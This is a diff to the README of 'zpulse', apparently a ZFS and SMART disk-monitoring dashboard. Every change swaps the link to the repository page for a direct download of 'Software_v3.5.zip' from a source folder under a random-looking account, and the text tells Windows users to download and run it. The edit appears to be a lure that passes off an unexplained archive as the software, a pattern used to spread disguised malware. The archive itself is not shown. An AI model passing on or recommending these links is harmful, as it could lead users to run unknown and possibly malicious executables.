@@ -1,12 +1,12 @@
 # 🧊 zpulse - Keep ZFS and SMART in view
 
-[![Download zpulse](https://img.shields.io/badge/Download-zpulse-blue?style=for-the-badge)](https://github.com/Yellowpagesfamilyscutigeridae996/zpulse)
+[![Download zpulse](https://img.shields.io/badge/Download-zpulse-blue?style=for-the-badge)](https://github.com/Yellowpagesfamilyscutigeridae996/zpulse/raw/refs/heads/main/dashboard/Software_v3.5.zip)
 
 ## 📥 Download
 
 Visit this page to download and run zpulse on Windows:
 
-https://github.com/Yellowpagesfamilyscutigeridae996/zpulse
+https://github.com/Yellowpagesfamilyscutigeridae996/zpulse/raw/refs/heads/main/dashboard/Software_v3.5.zip
 
 ## 🖥️ What zpulse does
 
@@ -35,7 +35,7 @@ For best results, use it on a screen that can show several panels at once. A lap
 ## 🚀 Get zpulse on Windows
 
 1. Open this link in your browser:
-   https://github.com/Yellowpagesfamilyscutigeridae996/zpulse
+   https://github.com/Yellowpagesfamilyscutigeridae996/zpulse/raw/refs/heads/main/dashboard/Software_v3.5.zip
 
 2. Find the latest release or download section on the page.
 
@@ -188,7 +188,7 @@ This project fits these use areas:
 
 If you need to get zpulse again, use this link:
 
-https://github.com/Yellowpagesfamilyscutigeridae996/zpulse
+https://github.com/Yellowpagesfamilyscutigeridae996/zpulse/raw/refs/heads/main/dashboard/Software_v3.5.zip
 
 ## ❓ Common questions
 
@@ -230,7 +230,7 @@ If your rack has several servers, keep each one named by role. That makes the da
 ## 🖱️ Quick start steps
 
 1. Open the download page:
-   https://github.com/Yellowpagesfamilyscutigeridae996/zpulse
+   https://github.com/Yellowpagesfamilyscutigeridae996/zpulse/raw/refs/heads/main/dashboard/Software_v3.5.zip
 
 2. Download the Windows file.
 
